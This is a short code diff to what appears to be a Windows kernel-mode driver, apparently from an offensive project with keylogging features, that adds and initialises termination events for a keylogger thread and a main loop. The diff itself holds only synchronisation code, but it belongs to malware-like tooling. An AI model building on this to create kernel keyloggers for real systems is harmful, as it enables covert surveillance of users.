@@ -82,6 +82,9 @@ namespace BeGlobals
     bool shutdown = false;
     bool logKeys = false;
 
+    KEVENT hKeyLoggerTerminationEvent;
+    KEVENT hMainLoopTerminationEvent;
+
     NTSTATUS
     BeInitGlobals()
     {
@@ -161,6 +164,10 @@ namespace BeGlobals
 
         BeCreateSharedMemory();
         LOG_MSG("Created shared memory\n");
+
+        KeInitializeEvent(&BeGlobals::hKeyLoggerTerminationEvent, NotificationEvent, FALSE);
+        KeInitializeEvent(&BeGlobals::hMainLoopTerminationEvent, NotificationEvent, FALSE);
+        LOG_MSG("Initialised termination events\n");
 
         return STATUS_SUCCESS;
     }
